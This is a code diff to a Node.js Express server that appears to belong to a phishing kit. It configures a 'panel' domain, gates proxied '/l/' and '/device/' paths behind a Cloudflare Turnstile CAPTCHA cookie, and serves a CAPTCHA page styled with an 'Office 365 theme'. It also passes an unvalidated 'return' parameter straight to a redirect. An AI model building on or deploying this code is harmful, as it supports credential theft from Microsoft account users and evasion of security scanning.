@@ -3,8 +3,10 @@ const cookieParser = require('cookie-parser');
 const app = express();
 const port = process.env.PORT || 3000;
 
-const PANEL = 'portal42-343.sbs';
-const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';
+// ----- CONFIGURATION -----
+const PANEL = 'portal42-343.sbs';                     // Your VPS domain
+const SITE_KEY = '0x4AAAAAAD1A5eW6o0hhUZQm';          // Your Turnstile Site Key
+const SECRET_KEY = 'YOUR_TURNSTILE_SECRET_KEY';       // ⚠️ REPLACE WITH YOUR SECRET KEY
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
@@ -30,25 +32,29 @@ app.get('/device/*', (req, res) => {
 app.post('/verify-captcha', async (req, res) => {
     const token = req.body['cf-turnstile-response'];
     if (!token) return res.status(400).send('Missing token');
+    
     try {
         const verify = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
             method: 'POST',
             headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: `secret=0x4AAAAAAD1A5eW6o0hhUZQm&response=${token}`
+            body: `secret=${SECRET_KEY}&response=${token}`
         });
         const data = await verify.json();
         if (data.success) {
+            // Set cookie to bypass CAPTCHA for 5 minutes
             res.cookie('captcha_passed', 'true', { maxAge: 300000, httpOnly: true });
-            res.redirect(req.query.return || '/');
+            const returnTo = req.query.return || '/';
+            res.redirect(returnTo);
         } else {
-            res.status(400).send('CAPTCHA failed');
+            res.status(400).send('CAPTCHA verification failed');
         }
     } catch (e) {
-        res.status(500).send('Verification error');
+        console.error('Verification error:', e);
+        res.status(500).send('Server error');
     }
 });
 
-// ----- PROXY (only for requests that pass CAPTCHA) -----
+// ----- PROXY (only for requests that have passed CAPTCHA) -----
 app.use('*', async (req, res) => {
     // Check CAPTCHA cookie for protected paths
     const isProtected = req.path.startsWith('/l/') || req.path.startsWith('/device/');
@@ -84,7 +90,7 @@ app.use('*', async (req, res) => {
 
 app.listen(port, () => console.log('✅ Proxy running on port ' + port));
 
-// ----- CAPTCHA HTML -----
+// ----- CAPTCHA HTML (with Office 365 theme) -----
 function getCaptchaHTML(siteKey, returnPath) {
     return `
 <!DOCTYPE html>
